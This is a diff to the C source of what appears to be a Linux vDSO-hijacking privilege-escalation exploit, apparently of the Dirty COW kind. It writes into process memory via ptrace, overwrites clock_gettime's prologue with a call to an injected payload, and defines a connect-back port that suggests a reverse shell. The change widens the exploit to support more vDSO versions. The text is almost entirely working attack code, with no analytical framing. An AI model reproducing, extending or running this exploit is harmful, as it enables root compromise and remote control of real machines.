@@ -33,6 +33,8 @@
 #define LOOP			0x10000
 #define VDSO_SIZE		(2 * PAGE_SIZE)
 #define CONNECT_BACK_PORT	1234
+#define PATCH			"\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef"
+#define ARRAY_SIZE(arr)		(sizeof(arr) / sizeof(arr[0]))
 
 typedef unsigned int uint32_t;
 typedef unsigned long uint64_t;
@@ -43,6 +45,11 @@ struct vdso_patch {
 	unsigned long addr;
 };
 
+struct prologue {
+	char *opcodes;
+	size_t size;
+};
+
 struct mem_arg  {
 	void *vdso_addr;
 	bool do_patch;
@@ -51,6 +58,11 @@ struct mem_arg  {
 
 static char child_stack[8192];
 static struct vdso_patch vdso_patch[2];
+
+static struct prologue prologues[] = {
+	/* push rbp; mov rbp, rsp; lfence */
+	{ "\x55\x48\x89\xe5\x0f\xae\xe8", 7 },
+};
 
 
 static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
@@ -94,11 +106,30 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 	return 0;
 }
 
+static int patch_payload(struct prologue *prologue)
+{
+	unsigned char *p;
+
+	p = memmem(payload, payload_len, PATCH, sizeof(PATCH)-1);
+	if (p == NULL) {
+		fprintf(stderr, "[-] failed to patch payload\n");
+		return -1;
+	}
+
+	memset(p, '\x90', sizeof(PATCH)-1 - prologue->size);
+	memcpy(p + sizeof(PATCH)-1 - prologue->size, prologue->opcodes, prologue->size);
+
+	return 0;
+}
+
 static int build_vdso_patch(void *vdso_addr)
 {
 	uint32_t clock_gettime_offset, target;
+	unsigned long clock_gettime_addr;
 	unsigned char *p, *buf;
+	struct prologue *prologue;
 	uint64_t entry_point;
+	bool patched;
 	int i;
 
 	fprintf(stderr, "[*] building vdso patch\n");
@@ -107,6 +138,24 @@ static int build_vdso_patch(void *vdso_addr)
 	p = vdso_addr;
 	entry_point = *(uint64_t *)(p + 0x18);
 	clock_gettime_offset = (uint32_t)entry_point & 0xfff;
+	clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
+
+	patched = false;
+	for (i = 0; i < ARRAY_SIZE(prologues); i++) {
+		prologue = &prologues[i];
+		if (memcmp((void *)clock_gettime_addr, prologue->opcodes, prologue->size) == 0) {
+			if (patch_payload(prologue) == -1)
+				return -1;
+			patched = true;
+			break;
+		}
+	}
+
+	if (!patched) {
+		fprintf(stderr, "[-] this vDSO version isn't supported\n");
+		fprintf(stderr, "    add first entry point instructions to prologues\n");
+		return -1;
+	}
 
 	/* patch #1: put payload at the end of vdso */
 	vdso_patch[0].patch = payload;
@@ -121,27 +170,21 @@ static int build_vdso_patch(void *vdso_addr)
 	}
 
 	/* patch #2: hijack clock_gettime prologue */
-	target = VDSO_SIZE - payload_len - clock_gettime_offset;
-
-	buf = malloc(7);
+	buf = malloc(sizeof(PATCH)-1);
 	if (buf == NULL) {
 		warn("malloc");
 		return -1;
 	}
 
-	buf[0] = '\x90'; // nop
-	buf[1] = '\x90'; // nop
-	buf[2] = '\xe8'; // call
-	*(uint32_t *)&buf[3] = target - 7;
+	/* craft call to payload */
+	target = VDSO_SIZE - payload_len - clock_gettime_offset;
+	memset(buf, '\x90', sizeof(PATCH)-1);
+	buf[0] = '\xe8';
+	*(uint32_t *)&buf[1] = target - 5;
 
 	vdso_patch[1].patch = buf;
-	vdso_patch[1].size = 7;
-	vdso_patch[1].addr = (unsigned long)vdso_addr + clock_gettime_offset;
-
-	if (memcmp((void *)vdso_patch[1].addr, "\x55\x48\x89\xe5\x0f\xae\xe8", 7) != 0) {
-		fprintf(stderr, "[-] this vDSO doesn't match exploit's version\n");
-		return -1;
-	}
+	vdso_patch[1].size = prologue->size;
+	vdso_patch[1].addr = clock_gettime_addr;
 
 	return 0;
 }
